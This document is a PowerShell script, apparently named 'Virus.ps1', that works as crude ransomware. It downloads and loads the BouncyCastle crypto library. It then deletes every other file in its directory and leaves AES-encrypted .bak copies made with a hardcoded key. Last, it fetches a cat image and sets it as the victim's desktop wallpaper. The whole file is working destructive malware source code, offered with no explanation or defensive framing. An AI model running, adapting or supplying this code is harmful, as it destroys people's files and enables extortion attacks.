Invoke-WebRequest -Uri 'https://www.bouncycastle.org/csharp/download/bccrypto-csharp-1.9.0-bin.zip' -OutFile 'C:\VNCS\crypto.zip'
Expand-Archive 'C:\VNCS\crypto.zip' -DestinationPath .
Add-Type -path "C:\VNCS\BouncyCastle.Crypto.dll"
$global:encMessage=''
Function Get-Cipher{
Param ($Message)
$secRandom =  new-object Org.BouncyCastle.Security.SecureRandom

$messageBytes = [System.Text.Encoding]::UTF8.GetBytes($message)

# if using files do this: 
# $messageBytes = [System.IO.File]::ReadAllBytes("C:\stack\out.txt")

#==== Key generation =====#

$keyBytes = New-Object byte[] 32
$secRandom.NextBytes($keyBytes) 
#$generator = [Org.BouncyCastle.Security.GeneratorUtilities]::GetKeyGenerator("AES")
$generator = New-Object Org.BouncyCastle.Crypto.CipherKeyGenerator 
$keyGenParam = new-object Org.BouncyCastle.Crypto.KeyGenerationParameters $keyBytes, 256
$generator.Init($keyGenParam)
$key = $generator.GenerateKey()
#or retreive from base64 string:
$key = [System.Convert]::FromBase64String("9JODwRWWHp6+uACUiydFXNXPmWDHbcObhgqR/cvZ9zg=")


#==== initialization vector (optional) =====#
#IV is a byte array, should be same as AES block size. By default 128 bit or 16 bytes (or less)

$IV = New-Object byte[] 16  
# below are some random IVs to play around, if IV parameter is not provided by user just keep it is array of 0s
$secRandom.NextBytes($IV) | Out-Null  #random generated 16 bytes
$IV = [System.Text.Encoding]::UTF8.GetBytes("Some_Password") #or use some random phrase


#==== Cipher set up =====#
#specify cipher type (typically CFB or CBC) and padding (use NOPADDING to skip). Check all possible values: 
#https://github.com/neoeinstein/bouncycastle/blob/master/crypto/src/security/CipherUtilities.cs

$cipher = [Org.BouncyCastle.Security.CipherUtilities]::GetCipher("AES/CFB/PKCS7")
$aesKeyParam = [Org.BouncyCastle.Security.ParameterUtilities]::CreateKeyParameter("AES", $key)
$keyAndIVparam = New-Object Org.BouncyCastle.Crypto.Parameters.ParametersWithIV $aesKeyParam, $IV


#==== Encrypt  =====#
#$cipher.Init($true,$aesKeyParam) 
$cipher.Init($true,$keyAndIVparam)
$dataSize = $cipher.GetOutputSize($messageBytes.Length)
$encMessageBytes = New-Object byte[]  $dataSize
$len = $cipher.ProcessBytes($messageBytes , 0, $messageBytes.Length, $encMessageBytes, 0)
$cipher.DoFinal($encMessageBytes, $len) | Out-Null

$global:encMessage = [System.Convert]::ToBase64String($encMessageBytes)

#if using files
#[System.IO.File]::WriteAllText("C:\stack\out.txt.aes", $encMessage)
#$encMessageBytes = [System.Convert]::FromBase64String([System.IO.File]::ReadAllText("C:\stack\out.txt.aes"))

#==== Decrypt =====#
#$cipher.Init($false,$aesKeyParam)
$cipher.Init($false,$keyAndIVparam)
$dataSize = $cipher.GetOutputSize($encMessageBytes.Length)
$decMessageBytes = New-Object byte[]  $dataSize
$len = $cipher.ProcessBytes($encMessageBytes , 0, $encMessageBytes.Length, $decMessageBytes, 0)
$cipher.DoFinal($decMessageBytes, $len) | Out-Null

$decMessage = [System.Text.Encoding]::UTF8.GetString($decMessageBytes).Trim([char]0)

}
$file = Get-ChildItem -Path . -Name
foreach($f in $file){
    if ($f -ne 'Virus.ps1'){
    $Content = Get-Content $f
    Remove-Item –path ./$f
    Get-Cipher $Content
    $global:encMessage | Out-File -FilePath ./$f.bak
    }
}
Invoke-WebRequest -Uri 'https://c4.wallpaperflare.com/wallpaper/927/710/567/6-cat-funny-grumpy-wallpaper-thumb.jpg' -OutFile 'C:\VNCS\Nice.jpg'
$MyWallpaper="C:\VNCS\Nice.jpg"
$code = @' 
using System.Runtime.InteropServices; 
namespace Win32{ 
    
     public class Wallpaper{ 
        [DllImport("user32.dll", CharSet=CharSet.Auto)] 
         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; 
         
         public static void SetWallpaper(string thePath){ 
            SystemParametersInfo(20,0,thePath,3); 
         }
    }
 } 
'@

add-type $code 
[Win32.Wallpaper]::SetWallpaper($MyWallpaper)
Add-Type -AssemblyName PresentationCore,PresentationFramework

